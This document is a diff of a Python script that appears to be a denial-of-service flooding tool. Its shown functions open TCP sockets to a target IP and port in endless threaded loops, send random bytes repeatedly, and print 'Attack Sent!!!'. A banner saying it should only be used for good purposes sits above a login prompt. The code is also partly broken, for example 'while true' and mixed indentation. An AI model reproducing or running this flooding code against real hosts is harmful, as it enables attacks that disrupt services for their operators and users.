@@ -46,6 +46,7 @@ print("")
 print("\033[94m_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—__\033[0m")
 print("\033[95m             SHOULD ONLY BE USED FOR GOOD PURPOSES                      \033[0m")
 print("\033[94m—_—_—_—_—_—_—_—_—_—_—_—_—_——_—_—_—_—_—_—_—_—_—_—_—_—_—_——_—_—_—__—\033[0m")
+
 while attemps < 100:
     username = input("\033[95mEnter your username: \033[0m")
     password = input("\033[94mEnter your password: \033[0m")
@@ -78,20 +79,21 @@ def run():
 		except:
 			print("[-] \033[97mError!!!\033[0m")
 
+
 def run2():
 	data = random._urandom(999)
 	i = random.choice(("[+]"))
 	while true:
 		try:
-		        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		        s.connect((ip,port))
-		        s.send(data)
-		        for x in range(times):
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
 				s.send(data)
-                        print(i + "\033[32mRequest Attack tcp::..\033[0m")
+			print(i +"Attack Sent!!!")
 		except:
-		        s.close()
-		        print("[-] \033[31mError!!!\033[0m")
+			s.close()
+			print("[*] Error!!!")
             
 
 def run3():
@@ -104,10 +106,10 @@ def run3():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i + " \033[95mSending Massage\033[0m")
+			print(i +"Attack Sent!!!")
 		except:
 			s.close()
-			print("[-] \033[31mMaybe down...!\033[0m")
+			print("[-] Error!!!")
             
   
 def run4():
@@ -120,12 +122,13 @@ def run4():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i + "\033[33mVolume " +str(u)+ " \033[94mAttack " +ip+ "\033[0m")
+			print(i +"Attack Sent!!!")
 		except:
 			s.close()
-			print("[-] \033[31mError!!!\033[0m"])
+			print("[-] Error!!!")
 
 
+											
 for y in range(threads):
 	if choice == 'y':
 		th = threading.Thread(target = run)
@@ -137,6 +140,3 @@ for y in range(threads):
 else:
 		th = threading.Thread(target = run4)
 		th.start()
-
-
-
